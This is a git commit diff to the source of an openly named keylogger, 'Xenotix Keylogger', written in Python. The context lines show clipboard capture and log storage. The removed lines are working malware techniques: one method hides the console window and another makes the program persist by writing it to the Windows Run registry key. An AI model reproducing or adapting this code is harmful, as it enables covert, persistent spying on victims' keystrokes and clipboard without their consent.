1615098f2077781d2b0d71954b30a468562cd292
Whysmerhill <Whysmerhill@gmail.com>
2018-03-23 14:32:08 +0100

    remove unused functions

--- keylog.py
+++ keylog.py
@@ -61,26 +61,6 @@ class Keylogger():
         win32clipboard.CloseClipboard()
         return tmp
 
-    # Hide Console
-    def hide(self):
-        import win32console
-        import win32gui
-        window = win32console.GetConsoleWindow()
-        win32gui.ShowWindow(window, 0)
-        return True
-
-    # Add to startup
-    def addStartup(self):
-        fp = os.path.dirname(os.path.realpath(__file__))
-        file_name = sys.argv[0].split("\\")[-1]
-        new_file_path = fp + "\\" + file_name
-        keyVal = r'Software\Microsoft\Windows\CurrentVersion\Run'
-
-        key2change = OpenKey(HKEY_CURRENT_USER,
-                             keyVal, 0, KEY_ALL_ACCESS)
-
-        SetValueEx(key2change, "Xenotix Keylogger", 0, REG_SZ, new_file_path)
-
     # Local storage of logs
     def local_logs(self):
         if len(self.data) > 0:
